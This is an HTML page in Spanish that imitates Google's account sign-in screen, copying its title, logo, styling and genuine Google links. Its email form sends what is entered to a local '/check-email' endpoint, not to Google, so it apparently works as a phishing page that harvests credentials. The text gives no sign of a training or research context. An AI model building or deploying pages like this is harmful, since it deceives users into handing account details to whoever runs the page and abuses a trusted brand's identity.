<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Iniciar sesión - Cuenta de Google</title>
    <style>
        body{font-family:'Roboto',arial,sans-serif;margin:0;background:#fff;color:#202124;min-height:100vh;display:flex;flex-direction:column;align-items:center;}
        .header{padding:20px;width:100%;text-align:right;}
        .header a{color:#5f6368;text-decoration:none;margin-left:16px;font-size:13px;}
        .logo{margin:40px 0 20px;}
        .container{width:100%;max-width:450px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;margin:0 auto;}
        h1{font-size:24px;font-weight:400;text-align:center;margin:0 0 8px;}
        .subtitle{text-align:center;color:#5f6368;margin-bottom:36px;}
        .input-field{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;margin-bottom:24px;}
        .input-field:focus{outline:none;border:2px solid #1a73e8;padding:12px 14px;}
        .links{margin-bottom:48px;}
        .links a{color:#1a73e8;text-decoration:none;font-weight:500;}
        .info{color:#5f6368;margin-bottom:32px;}
        .buttons{display:flex;justify-content:space-between;}
        .create-account{color:#1a73e8;font-weight:500;text-decoration:none;padding:10px 8px;}
        .next-button{background:#1a73e8;color:white;border:none;padding:10px 24px;border-radius:4px;cursor:pointer;}
        .footer{margin-top:24px;color:#5f6368;}
        @media(max-width:480px){.container{border:none;padding:24px;}}
    </style>
</head>
<body>
    <div class="header">
        <a href="https://accounts.google.com/signup">Crear cuenta</a>
        <a href="https://mail.google.com">Gmail</a>
        <a href="https://images.google.com">Imágenes</a>
    </div>
    
    <div class="logo">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_75x24dp.png" alt="Google" width="75" height="24">
    </div>
    
    <div class="container">
        <h1>Iniciar sesión</h1>
        <p class="subtitle">Utiliza tu cuenta de Google</p>
        
        <form action="/check-email" method="post">
            <input type="email" class="input-field" name="email" placeholder="Correo electrónico o teléfono" required autofocus>
            
            <div class="links">
                <a href="https://accounts.google.com/signin/recovery">¿Has olvidado tu correo electrónico?</a>
            </div>
            
            <div class="info">
                ¿No es tu ordenador? Usa el modo de invitado para iniciar sesión de forma privada.
                <a href="https://support.google.com/chrome/answer/6130773">Más información</a>
            </div>
            
            <div class="buttons">
                <a href="https://accounts.google.com/signup" class="create-account">Crear cuenta</a>
                <button type="submit" class="next-button">Siguiente</button>
            </div>
        </form>
    </div>
    
    <div class="footer">
        <select>
            <option>Español (España)</option>
            <option>English</option>
        </select>
    </div>
</body>
</html>
